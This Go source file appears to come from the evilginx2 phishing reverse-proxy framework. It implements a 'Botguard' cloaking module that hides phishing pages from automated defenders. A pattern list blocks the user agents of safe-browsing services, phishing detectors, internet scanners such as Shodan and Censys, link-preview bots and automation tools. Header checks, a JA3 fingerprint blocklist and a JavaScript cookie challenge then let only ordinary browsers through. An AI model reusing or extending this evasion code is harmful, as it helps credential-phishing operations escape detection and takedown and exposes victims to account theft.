package core

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

const (
	BOTGUARD_COOKIE_NAME = "_bg_v"
	BOTGUARD_CHALLENGE_TTL = 300 // seconds
)

// Known bot/scanner User-Agent patterns
var BOT_UA_PATTERNS = []string{
	`(?i)bot`,
	`(?i)crawler`,
	`(?i)spider`,
	`(?i)scraper`,
	`(?i)curl`,
	`(?i)wget`,
	`(?i)python-requests`,
	`(?i)python-urllib`,
	`(?i)go-http-client`,
	`(?i)java/`,
	`(?i)httpclient`,
	`(?i)headlesschrome`,
	`(?i)phantomjs`,
	`(?i)selenium`,
	`(?i)puppeteer`,
	`(?i)playwright`,
	`(?i)mechanize`,
	`(?i)libwww-perl`,
	`(?i)apache-httpclient`,
	`(?i)okhttp`,
	`(?i)node-fetch`,
	`(?i)axios`,
	`(?i)lynx`,
	`(?i)zgrab`,
	`(?i)masscan`,
	`(?i)nmap`,
	`(?i)censys`,
	`(?i)shodan`,
	`(?i)security`,
	`(?i)scanner`,
	`(?i)probe`,
	`(?i)check`,
	`(?i)monitor`,
	`(?i)validator`,
	`(?i)facebook`,
	`(?i)twitter`,
	`(?i)slack`,
	`(?i)discord`,
	`(?i)telegram`,
	`(?i)whatsapp`,
	`(?i)preview`,
	`(?i)google-safety`,
	`(?i)safebrowsing`,
	`(?i)phish`,
}

type Botguard struct {
	cfg              *Config
	challengeSecret  string
	botUaRegexps     []*regexp.Regexp
}

func NewBotguard(cfg *Config) *Botguard {
	bg := &Botguard{
		cfg:             cfg,
		challengeSecret: GenRandomToken(),
	}

	// Compile bot UA patterns
	for _, pattern := range BOT_UA_PATTERNS {
		re, err := regexp.Compile(pattern)
		if err == nil {
			bg.botUaRegexps = append(bg.botUaRegexps, re)
		}
	}

	return bg
}

// IsBot checks if the request appears to be from a bot.
// Returns true if the request should be blocked, false if it should be allowed.
func (bg *Botguard) IsBot(req *http.Request) bool {
	if !bg.cfg.IsBotguardEnabled() {
		return false
	}

	from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]

	// Check User-Agent against known bot patterns
	ua := req.Header.Get("User-Agent")
	if bg.isKnownBotUA(ua) {
		log.Debug("botguard: blocked known bot UA from %s: %s", from_ip, ua)
		return true
	}

	// Check for missing/empty User-Agent
	if ua == "" {
		log.Debug("botguard: blocked empty UA from %s", from_ip)
		return true
	}

	// Check for missing standard browser headers
	if bg.isMissingBrowserHeaders(req) {
		log.Debug("botguard: blocked request with missing browser headers from %s", from_ip)
		return true
	}

	// Check JA3 blocklist (if we have a TLS fingerprint header)
	ja3 := req.Header.Get("X-JA3-Fingerprint")
	if ja3 != "" && bg.isBlockedJa3(ja3) {
		log.Debug("botguard: blocked JA3 fingerprint from %s: %s", from_ip, ja3)
		return true
	}

	// Check JS challenge if enabled
	if bg.cfg.IsBotguardJsChallengeEnabled() {
		if !bg.hasValidChallenge(req) {
			return true
		}
	}

	return false
}

// GetChallengeHTML returns an HTML page with a JavaScript challenge.
// Bots that can't execute JavaScript will fail the challenge.
func (bg *Botguard) GetChallengeHTML(req *http.Request) string {
	token := bg.generateChallengeToken(req)

	// JavaScript challenge page that computes a token and sets a cookie
	return fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Please wait...</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;color:#333}
.container{text-align:center;padding:2rem}
.spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #333;border-radius:50%%;animation:spin 1s linear infinite;margin:0 auto 1rem}
@keyframes spin{0%%{transform:rotate(0deg)}100%%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
<div class="spinner"></div>
<p>Verifying your browser...</p>
</div>
<script>
(function(){
var t='%s';
var d=new Date();
d.setTime(d.getTime()+(300*1000));
var e="expires="+d.toUTCString();
document.cookie="%s="+t+";"+e+";path=/;SameSite=Lax";
setTimeout(function(){window.location.reload();},1500);
})();
</script>
</body>
</html>`, token, BOTGUARD_COOKIE_NAME)
}

// isKnownBotUA checks if the User-Agent matches known bot patterns
func (bg *Botguard) isKnownBotUA(ua string) bool {
	for _, re := range bg.botUaRegexps {
		if re.MatchString(ua) {
			return true
		}
	}
	return false
}

// isMissingBrowserHeaders checks for headers that legitimate browsers always send
func (bg *Botguard) isMissingBrowserHeaders(req *http.Request) bool {
	// Real browsers always send Accept-Language
	if req.Header.Get("Accept-Language") == "" {
		return true
	}

	// Real browsers always send Accept
	accept := req.Header.Get("Accept")
	if accept == "" {
		return true
	}

	// Check for suspicious Accept header (not requesting HTML for page loads)
	if req.Method == "GET" && !strings.Contains(req.URL.Path, ".") {
		// This is likely a page request - browsers always include text/html in Accept
		if !strings.Contains(accept, "text/html") && !strings.Contains(accept, "*/*") {
			return true
		}
	}

	return false
}

// isBlockedJa3 checks if a JA3 fingerprint is in the blocked list
func (bg *Botguard) isBlockedJa3(ja3 string) bool {
	blockedList := bg.cfg.GetBotguardBlockedJa3()
	for _, blocked := range blockedList {
		if blocked == ja3 {
			return true
		}
	}
	return false
}

// hasValidChallenge checks if the request has a valid JS challenge cookie
func (bg *Botguard) hasValidChallenge(req *http.Request) bool {
	cookie, err := req.Cookie(BOTGUARD_COOKIE_NAME)
	if err != nil || cookie.Value == "" {
		return false
	}

	// Validate the challenge token
	return bg.validateChallengeToken(req, cookie.Value)
}

// generateChallengeToken creates an HMAC-based challenge token
func (bg *Botguard) generateChallengeToken(req *http.Request) string {
	from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
	ua := req.Header.Get("User-Agent")

	// Create a token based on IP + UA + time bucket (5-minute windows)
	timeBucket := time.Now().Unix() / BOTGUARD_CHALLENGE_TTL
	data := fmt.Sprintf("%s|%s|%d", from_ip, ua, timeBucket)

	mac := hmac.New(sha256.New, []byte(bg.challengeSecret))
	mac.Write([]byte(data))
	return hex.EncodeToString(mac.Sum(nil))[:32]
}

// validateChallengeToken validates a challenge response
func (bg *Botguard) validateChallengeToken(req *http.Request, token string) bool {
	from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
	ua := req.Header.Get("User-Agent")

	// Check current and previous time buckets (to handle boundary cases)
	for i := int64(0); i <= 1; i++ {
		timeBucket := time.Now().Unix()/BOTGUARD_CHALLENGE_TTL - i
		data := fmt.Sprintf("%s|%s|%d", from_ip, ua, timeBucket)

		mac := hmac.New(sha256.New, []byte(bg.challengeSecret))
		mac.Write([]byte(data))
		expected := hex.EncodeToString(mac.Sum(nil))[:32]

		if token == expected {
			return true
		}
	}

	return false
}

